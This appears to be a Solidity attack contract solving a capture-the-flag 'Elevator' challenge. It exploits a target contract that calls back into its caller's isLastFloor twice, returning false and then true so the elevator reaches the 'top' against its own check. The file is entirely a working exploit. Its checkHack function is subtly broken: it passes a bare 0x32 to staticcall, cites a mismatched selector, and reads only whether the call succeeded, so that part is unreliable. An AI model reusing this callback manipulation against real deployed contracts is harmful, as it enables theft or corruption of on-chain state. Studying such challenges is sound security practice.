pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint) external;
    function top() external returns (bool);
}

contract ElevatorAttacker {
    uint256 private calls;
    address public elevatorInstance;

    constructor(address payable _elevatorInstance) {
        elevatorInstance = _elevatorInstance;
        calls = 0;
    }

    // Implement the Building interface function to flip the attack result
    function isLastFloor(uint256) external returns (bool) {
        calls += 1;
        return calls == 1;
    }

    // Function to start the attack using the target's goTo function
    function attack() public {
        Elevator(elevatorInstance).goTo(42); // Any floor number works
    }

    // View function to check if we succeeded
    function checkHack() public view returns (bool) {
        bool result;
        (result, ) = elevatorInstance.staticcall(0x32); // Select top() selector (0x8b5b5dd0)
        return result;
    }
}
